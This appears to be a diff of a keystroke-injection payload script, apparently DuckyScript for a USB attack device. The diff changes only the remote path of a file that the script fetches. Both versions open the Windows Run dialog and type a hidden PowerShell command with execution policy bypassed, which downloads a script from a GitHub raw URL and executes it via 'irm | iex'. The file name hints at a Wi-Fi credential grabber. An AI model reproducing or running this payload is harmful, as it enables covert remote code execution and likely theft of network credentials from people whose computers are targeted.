@@ -1,4 +1,4 @@
 GUI r
 DELAY 1000
-STRING powershell -w h -NoP -NonI -Ep Bypass irm https://raw.githubusercontent.com/markyway/speeldoos/main/Assets/Wifi_G.txt | iex
+STRING powershell -w h -NoP -NonI -Ep Bypass irm https://raw.githubusercontent.com/markyway/speeldoos/main/Assets/WifiG/Wifi_G | iex
 ENTER
